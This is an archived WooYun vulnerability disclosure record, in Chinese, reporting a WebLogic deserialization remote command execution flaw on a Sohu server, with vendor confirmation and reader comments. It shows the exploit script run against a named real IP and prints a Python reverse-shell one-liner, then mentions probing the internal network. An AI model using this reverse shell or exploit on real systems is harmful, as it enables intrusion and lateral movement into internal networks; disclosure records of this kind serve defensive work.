{"id": 86662, "wybug_id": "wooyun-2016-0190567", "wybug_title": "搜狐某服务器的存在命令执行漏洞威胁内网安全", "wybug_corp": "搜狐", "wybug_author": "李长歌", "wybug_date": "2016-03-30 00:04", "wybug_open_date": "2016-05-14 00:30", "wybug_type": "系统/服务补丁不及时", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方框架", "远程命令执行", "第三方不可信程序"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-30：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-30：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-04-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-04-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-14：\t细节向公众公开  简要描述： 搜狐某个服务器配置不当，存在远程命令执行漏洞 可威胁内网安全 详细说明：  服务器 123.125.123.26 存在weblogic 反序列化漏洞，没想到搜狐也存在这样的漏洞。\npython weblogic_exp.py http://123.125.123.26:8080\tweblogic unserialize vul is ok 123.125.123.26:8080\tWebPath: /DATA3/apps/psoft/webserv/HROUT\n\n\n可以直接上传一个脚本反弹一个shell\nimport socket,subprocess,oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((\" ip\",23333));os.dup2(s.fileno(),0)os.dup2(s.fileno(),1); os.dup2(s.fileno(),2)p=subprocess.call([\"/bin/sh\",\"-i\"])\n先来查看一下IP，可以发现该服务器是出于内网的，所以内部信息可以直接代理访问，或者进一步的渗透\n\n\n\n搜狐的内部安全中心\n\n   漏洞证明：  简单探测下内网。\n\n   修复方案：  修复下吧   版权声明：转载请注明来源 李长歌@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2016-03-30 00:25 厂商回复： 感谢支持 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-03-30 10:20 |    \t\tfeiyu \t\t\t( 普通白帽子  |\t\t\t        Rank:112 漏洞数:29        )\t\t \n  前排    \n     2016-05-14 00:39 |    \t\t坏男孩-A_A \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:23        | 膜拜学习中)\t\t \n  weblogic_exp.py  怎么写的啊，还可以取到路径啊    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}